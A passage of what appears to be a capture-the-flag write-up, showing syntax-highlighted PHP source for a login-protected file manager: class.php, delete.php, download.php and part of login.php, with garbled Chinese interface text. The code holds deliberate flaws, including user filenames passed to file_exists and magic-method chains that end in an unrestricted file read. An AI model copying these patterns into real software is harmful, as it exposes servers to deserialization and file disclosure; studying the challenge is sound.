        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">涓嬭浇&lt;/a> / &lt;a href="#" class="delete">鍒犻櫎&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//delete.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//download.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//login.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>

<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1, shrink-to-fit<span class="token punctuation">=</span>no<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>

  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Bootstrap core CSS --></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>


  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
    <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img <span class="token punctuation">{</span>
      font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">.</span>125rem<span class="token punctuation">;</span>
      text<span class="token operator">-</span>anchor<span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">media</span> <span class="token punctuation">(</span>min<span class="token operator">-</span>width<span class="token punctuation">:</span> 768px<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img<span class="token operator">-</span>lg <span class="token punctuation">{</span>
        font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">.</span>5rem<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Custom styles for this template --></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/std.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-signin<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>h3 mb-3 font-weight-normal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Username<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Password<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-lg btn-primary btn-block<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鎻愪氦<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-5 text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>杩樻病鏈夎处鍙�<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>娉ㄥ唽<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
